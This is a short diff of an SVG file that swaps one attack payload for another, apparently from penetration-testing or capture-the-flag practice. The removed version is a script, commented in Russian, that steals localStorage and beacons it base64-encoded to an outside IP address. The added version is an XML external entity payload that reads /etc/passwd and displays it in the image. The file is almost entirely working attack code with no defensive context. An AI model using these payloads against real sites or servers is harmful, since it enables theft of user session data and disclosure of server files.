@@ -1,11 +1,5 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>
-    /* Пытаемся украсть Local Storage и Session Storage */
-    var ls = JSON.stringify(localStorage);
-    /* Кодируем в base64, чтобы спецсимволы не сломали ссылку */
-    var data = btoa(ls); 
-    
-    /* Отправляем добычу */
-    new Image().src = "http://192.168.188.192:8000/?storage=" + data;
-  </script>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
+  <text x="10" y="40" font-size="20">Content: &xxe;</text>
 </svg>
